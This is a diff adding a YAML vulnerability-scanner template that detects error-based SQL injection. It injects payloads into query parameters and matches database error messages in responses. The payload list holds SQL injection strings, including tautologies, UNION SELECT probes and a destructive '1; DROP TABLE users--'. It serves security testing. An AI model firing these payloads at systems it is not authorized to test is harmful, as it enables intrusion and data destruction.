@@ -1,0 +1,49 @@
+id: sqli-error
+info:
+  name: "SQL Injection - Error Based"
+  severity: high
+  description: "Detects error-based SQL injection via database error messages in the response"
+  tags: [sqli, injection, database]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  - "'"
+  - "''"
+  - "`"
+  - "\""
+  - "1' OR '1'='1"
+  - "1' OR '1'='1'--"
+  - "' OR 1=1--"
+  - "' OR 'x'='x"
+  - "1; DROP TABLE users--"
+  - "1 UNION SELECT NULL--"
+  - "1 UNION SELECT NULL,NULL--"
+  - "1 UNION SELECT NULL,NULL,NULL--"
+  - "') OR ('1'='1"
+  - "admin'--"
+  - "1' ORDER BY 1--"
+  - "1' ORDER BY 100--"
+
+matchers:
+  body_patterns:
+    - "(?i)you have an error in your sql syntax"
+    - "(?i)warning.*mysql"
+    - "(?i)unclosed quotation mark"
+    - "(?i)quoted string not properly terminated"
+    - "(?i)pg_query\\(\\).*failed"
+    - "(?i)ORA-[0-9]{4,}"
+    - "(?i)Microsoft OLE DB Provider for SQL Server"
+    - "(?i)SQLite3::query"
+    - "(?i)sqlite_error"
+    - "(?i)supplied argument is not a valid (MySQL|PostgreSQL)"
+    - "(?i)error in your SQL syntax"
+    - "(?i)Dynamic SQL Error"
+    - "(?i)ODBC SQL Server Driver"
+    - "(?i)SQL command not properly ended"
+    - "(?i)Syntax error.*in query expression"
+    - "(?i)mysql_fetch"
+    - "(?i)pg_exec\\(\\)"
+    - "(?i)unterminated quoted string"
